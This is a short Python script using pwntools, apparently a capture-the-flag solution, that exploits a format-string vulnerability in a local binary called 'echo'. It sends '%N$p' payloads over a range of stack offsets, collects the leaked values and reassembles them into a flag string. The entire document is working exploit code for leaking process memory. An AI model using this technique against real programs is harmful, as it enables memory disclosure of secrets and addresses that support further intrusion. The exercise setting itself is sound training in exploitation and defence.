#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("./echo", checksec=False)
#libc = ELF("/tmp/libc6_2.27-0ubuntu3_i386.so", checksec=False)

#p = process()
#p = remote()

flag = b""
for i in range(27, 40):
    payload = f"%{i}$p".encode()
    
    p = process([exe.path])
    p.sendlineafter(b"> ", payload)
    leak = p.recvline().strip()
    log.info(f"Leak {i}: {leak}")
    flag += p32(int(leak, 16))

    #p.recvall()
    p.close()

    if b"}" in flag:
        log.success(flag)
        exit(0)
